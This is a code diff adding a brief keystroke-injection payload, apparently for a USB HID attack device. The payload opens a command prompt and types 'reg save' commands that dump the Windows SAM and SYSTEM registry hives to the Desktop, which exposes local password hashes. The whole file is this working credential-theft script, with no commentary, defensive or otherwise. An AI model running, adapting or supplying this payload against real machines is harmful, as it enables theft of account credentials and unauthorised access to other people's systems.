@@ -1,0 +1,9 @@
+GUI r
+DELAY 500
+STRING cmd.exe
+ENTER
+DELAY 500
+STRING reg save hklm\sam %userprofile%\Desktop\sam
+ENTER
+STRING reg save hklm\system %userprofile%\Desktop\system
+ENTER
